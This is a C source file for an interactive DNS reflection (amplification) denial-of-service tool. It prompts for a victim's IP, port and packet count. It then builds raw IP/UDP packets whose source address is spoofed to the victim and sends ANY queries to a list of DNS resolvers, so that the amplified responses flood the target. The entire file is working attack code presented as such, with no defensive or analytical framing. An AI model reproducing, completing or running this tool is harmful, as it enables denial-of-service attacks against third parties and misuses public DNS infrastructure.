#include <stdio.h>	
#include <string.h>
#include <sys/socket.h>	
#include <stdlib.h> 
#include <errno.h> //For errno - the error number
#include <netinet/udp.h>	//Provides declarations for udp header
#include <netinet/ip.h>	//Provides declarations for ip header
#include <arpa/inet.h>
#include <time.h>
#include <unistd.h> 
#include "utilities.h"

void dns_reflection(char * victimIP, int victimPort, int query_type, int nPackets){
	unsigned char dnsServers[20][20];
	unsigned char hostNames[20][30];
	int nDns, nHost;
	//load dns servers
	FILE * dnsIPs = fopen ("assets/dns_ips.txt", "r");
	int i = 0;
	while(i < 20 && fgets(dnsServers[i++], 20, dnsIPs)){
		if (dnsServers[i - 1][strlen(dnsServers[i - 1]) - 1] == '\n'){
			//remove newline at the end
			dnsServers[i - 1][strlen(dnsServers[i - 1]) - 1] = 0;
		}	
	}
	nDns = i - 1;
	fclose(dnsIPs);
	printf("%d dns servers loaded.\n", nDns);

	//load hostnames
	FILE * hostNameFile = fopen ("assets/dns_hosts.txt", "r");
	i = 0;
	while(i < 20 && fgets(hostNames[i++], 20, hostNameFile)){
		if (hostNames[i - 1][strlen(hostNames[i - 1]) - 1] == '\n'){
			//remove newline at the end
			hostNames[i - 1][strlen(hostNames[i - 1]) - 1] = 0;
		}	
	}
	nHost = i - 1;
	fclose(hostNameFile);
	printf("%d host names loaded.\n", nHost);

    //Create a raw socket of type IPPROTO
	int s = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
	
	if(s == -1)
	{
		//socket creation failed, may be because of non-root privileges
		perror("Failed to create raw socket");
		exit(1);
	}
	
	//Datagram to represent the packet
	unsigned char datagram[40000] , source_ip[32] , *data , *pseudogram;
	
	
	//zero out the packet buffer
	memset (datagram, 0, 40000);
	
	//IP header
	struct iphdr *iph = (struct iphdr *) datagram;
	
	//UDP header
	struct udphdr *udph = (struct udphdr *) (datagram + sizeof (struct ip));
	
	struct sockaddr_in sin;
	struct pseudo_header psh;
	
	//Data part
	data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
	


	
	
	strcpy(source_ip , victimIP);
	
	sin.sin_family = AF_INET;
	sin.sin_port = htons(DNS_PORT);
	
	
	//Fill in the IP Header
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	
	iph->id = htonl (54321);	//Id of this packet
	iph->frag_off = 0;
	iph->ttl = 255;
	iph->protocol = IPPROTO_UDP;
	iph->check = 0;		//Set to 0 before calculating checksum
	iph->saddr = inet_addr ( source_ip );	//Spoof the source ip address
	
	

	//UDP header
	udph ->source = htons (victimPort);
	udph->dest = htons (DNS_PORT);	
	udph->check = 0;	//filled later by pseudo header
	
	//Now the UDP checksum using the pseudo header
	psh.source_address = inet_addr( source_ip );
	psh.placeholder = 0;
	psh.protocol = IPPROTO_UDP;
	

	int nPacketSent = 0;

	while (nPackets--){
		//select hostname and dns server
		int curDns = rand() % nDns;
		int curHost = rand() % nHost;

		//create dns payload
		int payloadLength = dns_payload_gen(data, hostNames[curHost], query_type);

		//update ip header
		iph -> daddr = inet_addr(dnsServers[curDns]);
		iph -> tot_len = sizeof (struct iphdr) + sizeof (struct udphdr) + payloadLength;

		//reset checksums
		iph -> check = 0;
		udph -> check = 0;

		//Ip checksum
		iph -> check = csum ((unsigned short *) datagram, iph->tot_len);

		//update udp header
		udph -> len = htons(8 + payloadLength);	//udp size
		

		//update udp checksum
		psh.dest_address = inet_addr(dnsServers[curDns]);
		psh.udp_length = htons(sizeof(struct udphdr) + payloadLength);
		int psize = sizeof(struct pseudo_header) + sizeof(struct udphdr) + payloadLength;
		pseudogram = malloc(psize);	
		memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
		memcpy(pseudogram + sizeof(struct pseudo_header) , udph , sizeof(struct udphdr) + payloadLength);
		udph -> check = csum( (unsigned short*) pseudogram , psize);
		free(pseudogram);

		//send packet
		if (sendto (s, datagram, iph->tot_len ,	0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
		{
			perror("sendto failed");
		}
		//Data send successfully
		else
		{
			nPacketSent++;
		}
	}
	close(s);
	printf("Attack completed. %d packets sent.\n", nPacketSent);

}

void dns_reflection_setup(){
	system("clear");
	printf("\033[01;33m"); //set color to yellow
	printf("⋊Ɔ∀⊥⊥∀ NOI⊥ƆƎ˥ℲƎᴚ SNᗡ\n");
	printf("\033[0m");//reset color

	char victimIp[32];
	int victimPort = 0;
	int nPackets = 0;
	
	while ((getchar()) != '\n'); //clear out buffer
	
	printf ("Enter victim's IP : ");
	fgets(victimIp, 32, stdin);
	victimIp[strcspn(victimIp, "\n")] = 0;

	printf ("Enter victim's port : ");
	scanf ("%d", &victimPort);

	printf ("Enter number of packets : ");
	scanf ("%d", &nPackets);

	printf ("DNS Request type : ANY\n");
    dns_reflection(victimIp, victimPort, ANY, nPackets);
}